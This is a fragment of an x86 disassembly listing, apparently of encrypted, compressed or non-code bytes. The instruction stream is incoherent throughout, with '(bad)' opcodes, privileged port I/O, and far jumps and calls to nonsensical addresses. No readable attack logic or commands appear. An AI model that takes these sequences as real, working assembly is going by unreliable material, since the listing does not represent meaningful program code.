  40572d:	mov    DWORD PTR [ecx+0x29efaaa9],ebx
  405733:	mov    dh,0xce
  405735:	jg     0x405760
  405737:	mov    BYTE PTR [eax+0x3a],dh
  40573a:	int    0x78
  40573c:	mov    edi,0x443eae16
  405741:	in     eax,dx
  405742:	lods   eax,DWORD PTR ds:[esi]
  405743:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405744:	push   ss
  405745:	jno    0x405732
  405747:	stos   DWORD PTR es:[edi],eax
  405748:	out    dx,eax
  405749:	fdivr  QWORD PTR [esi-0x5f]
  40574c:	add    DWORD PTR [edx+eax*2],esi
  40574f:	ss ins DWORD PTR es:[edi],dx
  405751:	mov    ebp,DWORD PTR ds:0xd0f4a1c6
  405757:	inc    ebp
  405758:	stc    
  405759:	stos   BYTE PTR es:[edi],al
  40575a:	hlt    
  40575b:	mov    ah,0x32
  40575d:	test   DWORD PTR [ebx+0x5c],0x55b0bb85
  405764:	mov    BYTE PTR [edi-0x64],0xee
  405768:	mov    edi,0xcbd057aa
  40576d:	dec    BYTE PTR [eax-0x20c9f390]
  405773:	dec    esi
  405774:	call   0x945b7d0b
  405779:	lods   eax,DWORD PTR ds:[esi]
  40577a:	jmp    0x40574b
  40577c:	add    DWORD PTR [ebp+0x25],esi
  40577f:	clc    
  405780:	cmp    al,0x20
  405782:	inc    ecx
  405783:	test   al,0xfc
  405785:	jge    0x40578d
  405787:	push   esi
  405788:	and    eax,0x1e65af0d
  40578d:	push   edx
  40578e:	pop    edi
  40578f:	cmp    DWORD PTR [eax+0x10],0x4e577b64
  405796:	stos   DWORD PTR es:[edi],eax
  405797:	out    dx,eax
  405798:	cwde   
  405799:	mov    edx,0x4fb9f86
  40579e:	add    eax,0xb2279689
  4057a3:	pusha  
  4057a4:	lahf   
  4057a5:	fucomi st,st(6)
  4057a7:	add    BYTE PTR [ebx],dl
  4057a9:	xchg   BYTE PTR [edi+0x3c3d2ccc],bh
  4057af:	pop    ds
  4057b0:	push   ss
  4057b1:	stos   DWORD PTR es:[edi],eax
  4057b2:	stos   BYTE PTR es:[edi],al
  4057b3:	fidivr DWORD PTR [edx-0x13ac2af4]
  4057b9:	pop    DWORD PTR [esi-0x36]
  4057bc:	les    esp,FWORD PTR [edi-0x1fb90e21]
  4057c2:	std    
  4057c3:	pusha  
  4057c4:	jns    0x4057d8
  4057c6:	mov    eax,0x38160e5e
  4057cb:	pop    esi
  4057cc:	(bad)  
  4057cd:	daa    
  4057ce:	in     eax,dx
  4057cf:	(bad)  
  4057d1:	mov    BYTE PTR [ebp+0x5e939e31],dh
  4057d7:	jnp    0x40577c
  4057d9:	sub    ebp,eax
  4057db:	mov    ah,0xfb
  4057dd:	jecxz  0x4057a9
  4057df:	inc    ebx
  4057e0:	jb     0x4057d4
  4057e2:	mov    ds:0xc89c29de,eax
  4057e7:	adc    eax,0x256a431a
  4057ec:	mov    al,0xfd
  4057ee:	sahf   
  4057ef:	xchg   ebp,eax
  4057f0:	outs   dx,BYTE PTR ds:[esi]
  4057f1:	jbe    0x4057da
  4057f3:	cmc    
  4057f4:	push   0xffffffdf
  4057f6:	dec    esi
  4057f7:	xor    DWORD PTR [esi],ecx
  4057f9:	push   es
  4057fa:	dec    esi
  4057fb:	push   ebx
  4057fc:	cdq    
  4057fd:	or     BYTE PTR [esi+eiz*1+0x7b],bl
  405801:	xchg   ebx,eax
  405802:	xchg   edi,eax
  405803:	shl    eax,1
  405805:	and    dl,dl
  405807:	mov    edi,0xd21870df
  40580c:	cdq    
  40580d:	xchg   esp,edx
  40580f:	push   edx
  405810:	mov    ebx,0x604d5dd
  405815:	or     DWORD PTR [ecx],ebp
  405817:	mov    ebp,0xcf3ef9a8
  40581c:	pop    edi
  40581d:	pop    edx
  40581e:	pop    edx
  40581f:	pusha  
  405820:	out    0x14,al
  405822:	or     al,0x10
  405824:	mov    dh,0xd0
  405826:	add    al,0x65
  405828:	push   ecx
  405829:	stos   DWORD PTR es:[edi],eax
  40582a:	mov    dh,0x92
  40582c:	inc    edx
  40582d:	pop    ecx
  40582e:	mov    dl,0x9b
  405830:	push   eax
  405831:	pop    edi
  405832:	into   
  405833:	fnstcw WORD PTR ds:0xa9b56845
  405839:	jae    0x4058a4
  40583b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40583c:	push   0x7d
  40583e:	dec    eax
  40583f:	jne    0x40581a
  405841:	jmp    0x502:0x69117676
  405848:	(bad)  
  405849:	adc    al,dl
  40584b:	imul   ebp
  40584d:	dec    esi
  40584e:	adc    esi,DWORD PTR [ebp+0x2]
  405851:	adc    BYTE PTR [esi+0x56],0x68
  405855:	sub    DWORD PTR [ebx+0x3f],0xc30e5374
  40585c:	mov    ecx,0xfcc15a52
  405861:	push   es
  405862:	nop
  405863:	nop
  405864:	cmp    dh,BYTE PTR [edi+0xb]
  405867:	dec    esp
  405868:	(bad)  
  405869:	push   cs
  40586a:	cwde   
  40586b:	xchg   ebp,eax
  40586c:	ret    0xc3c8
  40586f:	jmp    0x40585c
  405871:	sbb    ecx,edx
  405873:	(bad)  
  405874:	rol    BYTE PTR [ebp-0x4b],1
  405877:	cmp    BYTE PTR [esi],dl
  405879:	repz sub al,0x27
  40587c:	sub    ah,BYTE PTR [esi+0x4a960e15]
  405882:	adc    BYTE PTR [edi-0x44548a50],dh
  405888:	pop    esp
  405889:	pop    esi
  40588a:	daa    
  40588b:	call   0x9210:0xccd3e2c7
  405892:	mov    cl,0x6d
  405894:	in     eax,dx
  405895:	mov    ebp,0x560d065d
  40589a:	aad    0xd9
  40589c:	mov    al,0xa7
  40589e:	mov    edx,0x879bd912
  4058a3:	dec    eax
  4058a4:	jo     0x405878
  4058a6:	aas    
  4058a7:	mov    ds:0xd15875d7,eax
  4058ac:	lahf   
  4058ad:	adc    BYTE PTR [edx-0x7d5d994c],dl
  4058b3:	js     0x405916
  4058b5:	les    ecx,FWORD PTR [esi+0x36c4c658]
  4058bb:	sbb    eax,0xa79b960c
  4058c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058c1:	or     eax,0x13ce7a52
  4058c6:	jbe    0x405880
  4058c8:	pusha  
  4058c9:	cmc    
  4058ca:	fisttp QWORD PTR [eax]
  4058cc:	aad    0x65
  4058ce:	lock aaa 
  4058d0:	push   esi
  4058d1:	or     bh,bh
  4058d3:	or     al,0x4d
  4058d5:	sub    esp,DWORD PTR [ebx+eiz*4]
  4058d8:	mov    esi,0xdecec476
  4058dd:	or     esp,edi
  4058df:	icebp  
  4058e0:	loopne 0x405895
  4058e2:	dec    edi
  4058e3:	ret    0xc082
  4058e6:	loop   0x4058de
  4058e8:	adc    ecx,DWORD PTR [ecx-0x3c3cf79a]
  4058ee:	xlat   BYTE PTR ds:[ebx]
  4058ef:	icebp  
  4058f0:	test   eax,0x9354f58d
  4058f5:	aad    0x6f
  4058f7:	ja     0x40588d
  4058f9:	mov    al,es:0xcb18bbbc
  4058ff:	and    eax,esi
  405901:	jne    0x405904
  405903:	fnstcw WORD PTR [edx+ecx*2+0x1f]
  405907:	mov    ch,0xa8
  405909:	ja     0x405896
  40590b:	pop    ds
  40590c:	sub    BYTE PTR [ecx],bh
  40590e:	lds    ebx,FWORD PTR ds:[esi-0x20fe10a9]
  405915:	lock xor al,0xfc
  405918:	dec    eax
  405919:	mov    bh,0xf2
  40591b:	push   ecx
  40591c:	or     al,BYTE PTR [edi-0x207f36a7]
  405922:	jp     0x405934
  405924:	ja     0x405919
  405926:	inc    edx
  405927:	shr    DWORD PTR [esi-0x5f],cl
  40592a:	or     ch,ch
  40592c:	sti    
  40592d:	push   0xe22aa8d1
  405932:	adc    bh,BYTE PTR [esp+ebp*2]
  405935:	std    
  405936:	lea    ebx,[ecx-0x43]
  405939:	push   esi
  40593a:	mov    DWORD PTR ds:[edi-0x7ac4d866],edx
  405941:	ffree  st(7)
  405943:	mov    ecx,0xd3da7027
  405948:	test   BYTE PTR [ebp+ebx*4+0xaa989f2],bl
  40594f:	sti    
  405950:	pop    es
  405951:	jno    0x4059cb
  405953:	imul   ecx
  405955:	xchg   edi,eax
  405956:	dec    esi
  405957:	mov    ecx,0x56819a19
  40595c:	shl    DWORD PTR [ebx+eax*2],0xd4
  405960:	dec    ecx
  405961:	cld    
  405962:	mov    esi,DWORD PTR [edx+0x34]
  405965:	dec    ebp
  405966:	in     eax,dx
  405967:	adc    al,0xbb
  405969:	cmp    al,0x2a
  40596b:	dec    esp
  40596c:	mov    ecx,0xc0d4a794
  405971:	retf   0xacdc
  405974:	sbb    edi,DWORD PTR [edi]
  405976:	adc    al,0x79
  405978:	out    dx,al
  405979:	sub    DWORD PTR [edi],edx
  40597b:	cmp    ch,BYTE PTR [esi-0x1d]
  40597e:	mov    edx,0x5cbc9f62
  405983:	(bad)  
  405984:	xchg   ebx,eax
  405985:	mov    edi,0xc9812a4e
  40598a:	stos   DWORD PTR es:[edi],eax
  40598b:	jmp    0x405977
  40598d:	mov    al,0xa8
  40598f:	push   0x8711be88
  405994:	into   
  405995:	out    0xde,eax
  405997:	shl    edx,0x22
  40599a:	nop
  40599b:	ret    
  40599c:	jmp    DWORD PTR [ecx-0x78]
  40599f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4059a0:	es (bad) 
  4059a2:	jmp    0x405988
  4059a4:	imul   esi,DWORD PTR [esi+ebp*1-0x5f],0xffffffb2
  4059a9:	inc    BYTE PTR [eax+eiz*2]
  4059ac:	std    
  4059ad:	pusha  
  4059ae:	jecxz  0x4059ed
  4059b0:	stos   BYTE PTR es:[edi],al
  4059b1:	leave  
  4059b2:	mov    ch,0xc4
  4059b4:	mov    eax,ds:0xc6920292
  4059b9:	xchg   DWORD PTR [eax+0x3c921a2],ecx
  4059bf:	or     BYTE PTR ds:0x84a448ac,bl
  4059c5:	jbe    0x405a10
  4059c7:	dec    ebx
  4059c8:	mov    al,ds:0xd34f5737
  4059cd:	es mov bl,0x6e
  4059d0:	sub    al,0xfa
  4059d2:	lds    edx,FWORD PTR [edx+0x4207ad63]
  4059d8:	pop    ecx
  4059d9:	mov    ah,0xcf
  4059db:	push   0xffffffdc
  4059dd:	fnstenv [esi]
  4059df:	add    esp,edx
  4059e1:	out    0xb0,al
  4059e3:	test   DWORD PTR [eax+0x6a634979],0xc5e7f01e
  4059ed:	sbb    edi,DWORD PTR [ebx+edx*1+0x5e91f2cf]
  4059f4:	cdq    
  4059f5:	sbb    ah,ah
  4059f7:	mov    ah,0x5b
  4059f9:	push   eax
  4059fa:	and    eax,0x4830d6cb
  4059ff:	jecxz  0x405a55
  405a01:	popf   
  405a02:	pop    es
  405a03:	dec    ebx
  405a04:	jl     0x4059ed
  405a06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a07:	aam    0xe4
  405a09:	mov    BYTE PTR [ebx-0x20],bl
  405a0c:	outs   dx,DWORD PTR ds:[esi]
  405a0d:	mov    ds:0xb6d4d6b2,al
  405a12:	dec    esi
  405a13:	xchg   edx,eax
  405a14:	jb     0x405a68
  405a16:	pop    ebx
  405a17:	shl    bh,0x11
  405a1a:	int    0x3f
  405a1c:	iret   
  405a1d:	aaa    
  405a1e:	lods   al,BYTE PTR ds:[esi]
  405a1f:	adc    DWORD PTR [ebx+0x39],esi
  405a22:	pop    ecx
  405a23:	mov    cl,0xcd
  405a25:	pop    eax
  405a26:	ffree  st(2)
  405a28:	push   esp
  405a29:	jno    0x405a0c
  405a2b:	arpl   WORD PTR [edx],di
  405a2d:	adc    cl,BYTE PTR [ebx-0x76b40fbb]
  405a33:	inc    ebp
  405a34:	fcom   QWORD PTR [ebx]
  405a36:	ror    DWORD PTR [ebx+0x4589e445],0xe0
  405a3d:	add    eax,eax
  405a3f:	mov    ebx,0xf89c853c
  405a44:	sbb    DWORD PTR ds:0x42a375,0x49a8
  405a4e:	mov    DWORD PTR [ebp-0x50],ebx
  405a51:	jmp    0x405f5c
  405a56:	retf   0xd1c9
  405a59:	rcl    cl,1
  405a5b:	ror    cl,1
  405a5d:	fsin   
  405a5f:	sbb    DWORD PTR [ecx],ebp
  405a61:	pop    es
  405a62:	jmp    0x7c5e8ec2
  405a67:	ret    
  405a68:	js     0x405ae2
  405a6a:	push   0x7c
  405a6c:	js     0x405ae6
  405a6e:	pop    edx
  405a6f:	test   BYTE PTR [edx],0x46
  405a72:	add    al,0xb1
  405a74:	imul   esi,ecx,0x43
  405a77:	mov    ecx,0xb97dba77
  405a7c:	xor    dh,BYTE PTR [esi-0x19]
  405a7f:	fbld   TBYTE PTR [ebx]
  405a81:	shr    BYTE PTR [esi+edx*1-0x1c5c1348],1
  405a88:	sbb    eax,0x45500145
  405a8d:	or     BYTE PTR [ebp-0x18],ch
  405a90:	inc    edi
  405a91:	arpl   dx,bx
  405a93:	xchg   edi,eax
  405a94:	cli    
  405a95:	ja     0x405a4f
  405a97:	dec    ebx
  405a98:	jb     0x405a97
  405a9a:	jns    0x405a64
  405a9c:	push   ecx
  405a9d:	pushf  
  405a9e:	mov    esi,0xc945849
  405aa3:	cmp    BYTE PTR [eax+0x4651c8cc],dl
  405aa9:	mov    ebp,0xed8e5432
  405aae:	or     ebp,DWORD PTR [ecx+0x652dbcc3]
  405ab4:	mov    esi,0xdfc02d59
  405ab9:	ins    DWORD PTR es:[edi],dx
  405aba:	inc    ebx
  405abb:	inc    esi
  405abc:	fnstenv [eax]
  405abe:	mov    al,ds:0xb36a2be1
  405ac3:	ins    DWORD PTR es:[edi],dx
  405ac4:	jns    0x405a92
  405ac6:	or     eax,0x33a2fc08
  405acb:	dec    DWORD PTR [eax]
  405acd:	add    BYTE PTR [ecx],cl
  405acf:	daa    
  405ad0:	mov    bl,0x68
  405ad2:	and    DWORD PTR [ebx-0x569bfc8f],esp
  405ad8:	pop    ebp
  405ad9:	lods   al,BYTE PTR ds:[esi]
  405ada:	call   0x4f45:0xe8a043b0
  405ae1:	stos   BYTE PTR es:[edi],al
  405ae2:	(bad)  
  405ae4:	fmul   QWORD PTR [ecx+0x4c]
  405ae7:	cli    
  405ae8:	ins    DWORD PTR es:[edi],dx
  405ae9:	lea    ecx,[edi]
  405aeb:	mov    ch,dl
  405aed:	(bad)  
  405aee:	leave  
  405aef:	repz mov es,WORD PTR [esi]
  405af2:	or     ebx,DWORD PTR [eax+0x67ebc2e6]
  405af8:	inc    edx
  405af9:	jb     0x405b72
  405afb:	cwde   
  405afc:	stos   BYTE PTR es:[edi],al
  405afd:	pop    esp
  405afe:	mov    bh,0x69
  405b01:	aad    0x26
  405b03:	aaa    
  405b04:	pusha  
  405b05:	mov    edx,0x73e7ae68
  405b0a:	inc    ebp
  405b0b:	test   BYTE PTR [ecx],0x7c
  405b0e:	mov    cl,0xb7
  405b10:	das    
  405b11:	les    ecx,FWORD PTR [ebx]
  405b13:	leave  
  405b14:	into   
  405b15:	adc    eax,0x44d538a8
  405b1a:	dec    esi
  405b1b:	imul   esp,DWORD PTR [edx+0x1795ff5f],0x696e9759
  405b25:	sahf   
  405b26:	icebp  
  405b27:	or     eax,0xb79a824b
  405b2c:	sbb    DWORD PTR [ebx+0x2df72277],eax
  405b32:	retf   0x9129
  405b35:	sub    ah,BYTE PTR [ecx-0x63190c5c]
  405b3b:	push   ss
  405b3c:	aas    
  405b3d:	xor    eax,0x7a55ad3a
  405b42:	or     edi,DWORD PTR [edx+0x56]
  405b45:	rol    DWORD PTR [edx-0xe3c1f0],0x50
  405b4c:	dec    ebp
  405b4d:	lds    ecx,FWORD PTR [esi-0x6b95291a]
  405b53:	fbld   TBYTE PTR [ebx]
  405b55:	cmp    eax,0x9ee0d71e
  405b5a:	ret    0x3b50
  405b5d:	(bad)  
  405b5f:	dec    eax
  405b60:	and    DWORD PTR [ebx-0x3a],eax
  405b63:	neg    DWORD PTR [ecx+eiz*2]
  405b66:	dec    DWORD PTR [edi+0x2b46c0b3]
  405b6c:	pop    ecx
  405b6d:	data16 out 0xb7,al
  405b70:	mov    ds:0xe52ad975,al
  405b75:	push   ss
  405b76:	mov    ebx,DWORD PTR [ebx-0x2e]
  405b79:	and    al,0xe7
  405b7b:	clc    
  405b7c:	jmp    0xec1d:0xa6ecf242
  405b83:	dec    ebx
  405b84:	out    0xfd,eax
  405b86:	add    al,0xd8
  405b88:	ds xchg ecx,eax
  405b8a:	sub    eax,eax
  405b8c:	push   eax
  405b8d:	enter  0x649b,0xa6
  405b91:	jle    0x405b87
  405b93:	clc    
  405b94:	aad    0xcc
  405b96:	jo     0x405bb5
  405b98:	lock xchg dh,bh
  405b9b:	clc    
  405b9c:	repz scas eax,DWORD PTR es:[edi]
  405b9e:	sbb    BYTE PTR [edi],cl
  405ba0:	jnp    0x405b3e
  405ba2:	add    al,0xd6
  405ba4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ba5:	cs pop edx
  405ba7:	in     eax,0x17
  405ba9:	or     al,0x7d
  405bab:	push   es
  405bac:	out    dx,eax
  405bad:	out    dx,eax
  405bae:	(bad)  
  405baf:	mov    esp,fs
  405bb1:	or     eax,0x3bad0587
  405bb6:	xchg   ebx,eax
  405bb7:	lahf   
  405bb8:	cmp    BYTE PTR [esi],ah
  405bba:	jbe    0x405bf8
  405bbc:	jmp    0x405be7
  405bbe:	or     dl,cl
  405bc0:	jp     0x405b5a
  405bc2:	shr    DWORD PTR [ecx+0x6bac1658],cl
  405bc8:	push   esp
  405bc9:	or     esp,DWORD PTR [edi+0x2d7e9b96]
  405bcf:	adc    BYTE PTR [eax+0x6],bl
  405bd2:	inc    esp
  405bd3:	ret    
  405bd4:	cmc    
  405bd5:	scas   eax,DWORD PTR es:[edi]
  405bd6:	fs and ch,dh
  405bd9:	adc    esp,esp
  405bdb:	pop    edx
  405bdc:	not    DWORD PTR [esi]
  405bde:	xchg   edx,eax
  405bdf:	push   ecx
  405be0:	push   0xffffffc3
  405be2:	adc    al,0x5e
  405be4:	scas   al,BYTE PTR es:[edi]
  405be5:	rcl    BYTE PTR fs:[ebp+0x6f],cl
  405be9:	jge    0x405b6e
  405beb:	xor    ch,bh
  405bed:	ror    DWORD PTR [ebx],0xc5
  405bf0:	ins    BYTE PTR es:[edi],dx
  405bf1:	mov    fs:0xa9e1c692,al
  405bf7:	fidivr WORD PTR [eax+eax*1]
  405bfa:	pop    esp
  405bfb:	into   
  405bfc:	mov    ecx,DWORD PTR [edi-0x1965b5ce]
  405c02:	pop    eax
  405c03:	shr    BYTE PTR [ecx+0x6f355836],cl
  405c09:	pushf  
  405c0a:	dec    ecx
  405c0b:	cmp    BYTE PTR [esi],ch
  405c0d:	add    BYTE PTR [eax],0xb6
  405c10:	enter  0x5b13,0x4d
  405c14:	out    0x44,eax
  405c16:	push   ebx
  405c17:	push   esp
  405c18:	out    0x15,eax
  405c1a:	dec    edi
  405c1b:	cmp    edx,DWORD PTR [edx-0x4556d794]
  405c21:	xor    BYTE PTR [ebx-0x320c9c50],ch
  405c27:	inc    edi
  405c28:	dec    ecx
  405c29:	scas   al,BYTE PTR es:[edi]
  405c2a:	call   0x78df:0xaafd90ff
  405c31:	adc    BYTE PTR [edx+0x55d5fd33],bh
  405c37:	or     BYTE PTR [ebx],0xb1
  405c3a:	out    0xf4,eax
  405c3c:	ss pop ebx
  405c3e:	mov    eax,ds:0xbf76b7c0
  405c43:	cmp    bl,dh
  405c45:	mov    ah,0x16
  405c47:	es retf 0xd34e
  405c4b:	nop
  405c4c:	xor    dl,BYTE PTR [ebx+0x438ad581]
  405c52:	jbe    0x405be3
  405c54:	cdq    
  405c55:	clc    
  405c56:	sbb    BYTE PTR [esi+esi*4],bh
  405c59:	lea    eax,[edi]
  405c5b:	dec    edi
  405c5c:	call   0x8a80:0x8ed02cee
  405c63:	fistp  QWORD PTR [ebx-0x49794d0d]
  405c69:	in     eax,dx
  405c6a:	aas    
  405c6b:	(bad)  
  405c6c:	out    dx,al
  405c6d:	fcomp  DWORD PTR [esi-0x534b7e62]
  405c73:	or     esp,edx
  405c75:	jecxz  0x405c1a
  405c77:	lock inc esp
  405c79:	hlt    
  405c7a:	and    eax,0xa92e3faa
  405c7f:	push   ebx
  405c80:	push   ds
  405c81:	dec    ecx
  405c82:	cmp    eax,0xccdc3f2b
  405c87:	in     al,0x22
  405c89:	jg     0x405c35
  405c8b:	jne    0x405c8b
  405c8d:	jb     0x405c0f
  405c8f:	ss test al,0x7d
  405c92:	mov    dh,0xd1
  405c94:	adc    ecx,DWORD PTR [ebx-0x2b138cd3]
  405c9a:	jnp    0x405c95
  405c9c:	retf   0x9e13
  405c9f:	inc    edi
  405ca0:	int    0x26
  405ca2:	popa   
  405ca3:	jl     0x405d1e
  405ca5:	push   es
  405ca6:	xchg   esi,eax
  405ca7:	sub    esp,DWORD PTR [ecx]
  405ca9:	sub    edi,DWORD PTR [eax+0x205166e3]
  405caf:	push   cs
  405cb0:	popf   
  405cb1:	adc    edx,DWORD PTR [eax-0x57662284]
  405cb7:	stos   DWORD PTR es:[edi],eax
  405cb8:	jge    0x405ce1
  405cba:	aaa    
  405cbb:	or     DWORD PTR [ebx-0x55],ebx
  405cbe:	push   ebx
  405cbf:	push   cs
  405cc0:	xchg   ebx,eax
  405cc1:	mov    eax,ds:0x70f59710
  405cc6:	aaa    
  405cc7:	std    
  405cc8:	rcl    DWORD PTR [edi+0x32],cl
  405ccb:	(bad)  
  405ccd:	or     DWORD PTR [edi+0xfccdcc1],ebx
  405cd3:	into   
  405cd4:	xchg   edi,eax
  405cd5:	xchg   ebp,eax
  405cd6:	sahf   
  405cd7:	push   ds
  405cd8:	jle    0x405c88
  405cda:	popa   
  405cdb:	lds    ecx,FWORD PTR [edx+eiz*4]
  405cde:	mov    ds:0x33b52252,eax
  405ce3:	pop    ss
  405ce4:	loop   0x405d03
  405ce6:	in     eax,0x37
  405ce8:	repz xor eax,0x13883724
  405cee:	in     eax,dx
  405cef:	pop    esi
  405cf0:	int3   
  405cf1:	xlat   BYTE PTR ds:[ebx]
  405cf2:	add    eax,0x8a025690
  405cf7:	fldcw  WORD PTR es:[ebp+0x2fb51c9b]
  405cfe:	(bad)  
  405cff:	pop    ebp
  405d00:	sbb    dh,ch
  405d02:	mov    esp,0xb9301acf
  405d07:	int3   
  405d08:	clc    
  405d09:	sub    DWORD PTR [ecx+0x3b152c39],0x8d5ea14c
  405d13:	push   esi
  405d14:	mov    ah,0xd2
  405d16:	iret   
  405d17:	dec    ecx
  405d18:	fisubr DWORD PTR [ebp-0x3c40d4b]
  405d1e:	push   ecx
  405d1f:	aam    0xdc
  405d21:	cdq    
  405d22:	and    bl,bl
  405d24:	jae    0x405d5d
  405d26:	xor    BYTE PTR [ecx+0x486197a6],ch
  405d2c:	add    al,dl
  405d2e:	add    BYTE PTR [edx-0x7dae57d2],cl
  405d34:	inc    ebp
  405d35:	outs   dx,BYTE PTR ds:[esi]
  405d36:	in     al,0xc6
  405d38:	lods   al,BYTE PTR ds:[esi]
  405d39:	cwde   
  405d3a:	xchg   esi,eax
  405d3b:	dec    ecx
  405d3c:	repnz outs dx,DWORD PTR ds:[esi]
  405d3e:	mov    dl,0x25
  405d40:	test   eax,0x162ea175
  405d45:	and    eax,0xad4e297f
  405d4a:	in     eax,dx
  405d4b:	mov    dl,0xe
  405d4d:	add    DWORD PTR [eax+eax*4],ebx
  405d50:	jns    0x405d6f
  405d52:	sub    DWORD PTR [eax+0x32662541],esi
  405d58:	push   0xb68b13ab
  405d5d:	mov    ebx,0x741e2950
  405d62:	les    edx,FWORD PTR [edi]
  405d64:	fwait
  405d65:	mov    ecx,0x5a9bb242
  405d6a:	add    DWORD PTR [ebx+0x25],0xffffff9b
  405d6e:	ins    BYTE PTR es:[edi],dx
  405d6f:	mov    bl,0x9
  405d71:	out    dx,al
  405d72:	mov    DWORD PTR [ebp-0x74],esp
  405d75:	iret   
  405d76:	cli    
  405d77:	sub    DWORD PTR [ecx+esi*8],esp
  405d7a:	imul   eax,DWORD PTR [ebp+0x34],0xffffffaa
  405d7e:	arpl   WORD PTR ds:0x38f61c9a,bp
  405d84:	mov    ecx,0xe114297b
  405d89:	fs nop
  405d8b:	xlat   BYTE PTR ds:[ebx]
  405d8c:	jl     0x405d1c
  405d8e:	dec    ebx
  405d8f:	out    dx,al
  405d90:	bound  edx,QWORD PTR [edi-0x493f347c]
  405d96:	add    bl,BYTE PTR [edx]
  405d98:	add    bh,ah
  405d9a:	aad    0xbb
  405d9c:	cmp    eax,0xabf6fd6c
  405da1:	(bad)  
  405da2:	arpl   cx,bp
  405da4:	jl     0x405dd1
  405da6:	mov    al,0xa3
  405da8:	out    0x44,al
  405daa:	mov    dh,0x35
  405dac:	cmp    esi,DWORD PTR [edi-0x1bc95a6c]
  405db2:	stos   DWORD PTR es:[edi],eax
  405db3:	fs cmp dl,dl
  405db6:	pop    esi
  405db7:	ja     0x405d95
  405db9:	daa    
  405dba:	sbb    BYTE PTR [ecx],dl
  405dbc:	cmc    
  405dbd:	popf   
  405dbe:	out    0x33,al
  405dc0:	jecxz  0x405d7b
  405dc2:	pop    ecx
  405dc3:	les    ebp,FWORD PTR [edi+0x2b]
  405dc6:	pushf  
  405dc7:	shr    BYTE PTR [ebx],1
  405dc9:	inc    ebx
  405dca:	jecxz  0x405da2
  405dcc:	adc    bl,BYTE PTR [esi]
  405dce:	mov    eax,0xe923d650
  405dd3:	inc    edi
  405dd4:	hlt    
  405dd5:	jbe    0x405e0e
  405dd7:	dec    esi
  405dd8:	stc    
  405dd9:	imul   edx,ebx,0xe9bf37cb
  405ddf:	sahf   
  405de0:	and    al,0x23
  405de2:	pop    esp
  405de3:	pop    edx
  405de4:	or     edx,esi
  405de6:	test   eax,0x188349ae
  405deb:	repnz dec eax
  405ded:	push   ss
  405dee:	add    DWORD PTR [edx+0x27],ecx
  405df1:	jo     0x405d90
  405df3:	jg     0x405ded
  405df5:	and    al,0xf5
  405df7:	retf   0xc0de
  405dfa:	sub    edx,DWORD PTR [edx+0x74]
  405dfd:	mov    bh,0x9d
  405dff:	loop   0x405e74
  405e01:	xchg   DWORD PTR [esi-0x1cb5d899],ebp
  405e07:	xor    BYTE PTR [esi+0x42],ah
  405e0a:	xor    eax,DWORD PTR [edi]
  405e0c:	push   0xffffffb6
  405e0e:	mov    dh,0xaf
  405e10:	ror    DWORD PTR [ebp-0x43],1
  405e13:	mov    bl,0x40
  405e15:	xchg   esp,eax
  405e16:	das    
  405e17:	cmp    dl,BYTE PTR [ebx+ebp*1]
  405e1a:	ins    DWORD PTR es:[edi],dx
  405e1b:	push   ecx
  405e1c:	sbb    BYTE PTR [ecx+0x22f7d47d],bh
  405e22:	rol    BYTE PTR [ebx],cl
  405e24:	cmp    bh,bl
  405e26:	idiv   DWORD PTR [ebx-0x788153df]
  405e2c:	mov    bl,0x2a
  405e2e:	into   
  405e2f:	xor    al,0x9
  405e31:	neg    BYTE PTR [ecx]
  405e33:	jp     0x405e36
  405e35:	pop    ds
  405e36:	xlat   BYTE PTR ds:[ebx]
  405e37:	test   eax,0x176244b3
  405e3c:	hlt    
  405e3d:	inc    ebp
  405e3e:	mov    dl,0xa9
  405e40:	pop    ecx
  405e41:	cmp    BYTE PTR [ebp+0x14acece3],dl
  405e47:	retf   
  405e48:	add    dl,BYTE PTR [ebp+0x4f0e74cf]
  405e4e:	mov    edx,DWORD PTR [ecx]
  405e50:	aaa    
  405e51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405e52:	add    eax,0x1a1c28db
  405e57:	push   eax
  405e58:	lds    eax,FWORD PTR [edi]
  405e5a:	leave  
  405e5b:	call   0xa551:0xfbb7892c
  405e62:	push   esp
  405e63:	shl    BYTE PTR [ebx],1
  405e65:	jbe    0x405e58
  405e67:	ror    BYTE PTR ds:0xfdfd5ff5,1
  405e6d:	sbb    ebp,eax
  405e6f:	cmc    
  405e70:	xchg   ebx,eax
  405e71:	gs add eax,0xce1a8972
  405e77:	add    ecx,DWORD PTR [ecx]
  405e79:	in     al,0x93
  405e7b:	sub    eax,0x968111f3
  405e80:	jge    0x405e22
  405e82:	cmp    eax,0xb7a045ab
  405e87:	cli    
  405e88:	test   DWORD PTR [ecx+ebp*4+0x7b11e1ff],0xa866830b
  405e93:	rol    esp,1
  405e95:	popa   
  405e96:	xor    DWORD PTR [ecx+0x1e],ecx
  405e99:	mov    edi,ecx
  405e9b:	enter  0xfa90,0x80
  405e9f:	push   es
  405ea0:	pop    edi
  405ea1:	mov    ecx,0x2f040840
  405ea6:	adc    bh,cl
  405ea8:	jnp    0x405efd
  405eaa:	jle    0x405e30
  405eac:	fpatan 
  405eae:	xor    al,0x9e
  405eb0:	lahf   
  405eb1:	xchg   esi,eax
  405eb2:	jmp    0x405f2f
  405eb4:	gs stos BYTE PTR es:[edi],al
  405eb6:	add    DWORD PTR [esi],0x169ad24f
  405ebc:	ret    
  405ebd:	pusha  
  405ebe:	sbb    eax,0xfa132a5b
  405ec3:	aam    0xe5
  405ec5:	shl    BYTE PTR [ebp+0x51],1
  405ec8:	pop    edi
  405ec9:	push   esp
  405eca:	cmp    BYTE PTR fs:[esi+eiz*2],ch
  405ece:	push   esi
  405ecf:	inc    ebx
  405ed0:	adc    dh,BYTE PTR ds:0xe3957517
  405ed6:	cwde   
  405ed7:	jge    0x405eec
  405ed9:	cmp    BYTE PTR [eax+0x547ee4f0],dl
  405edf:	xor    eax,0x6e1d3c60
  405ee4:	pop    ebp
  405ee5:	in     eax,dx
  405ee6:	jae    0x405f59
  405ee8:	mov    BYTE PTR [ebp-0x14b05cbd],dl
  405eee:	repnz sbb ecx,DWORD PTR [ebx+0x3a]
  405ef2:	xor    esi,esi
  405ef4:	push   0x75b1bc1d
  405ef9:	mov    esp,0xb70a7f57
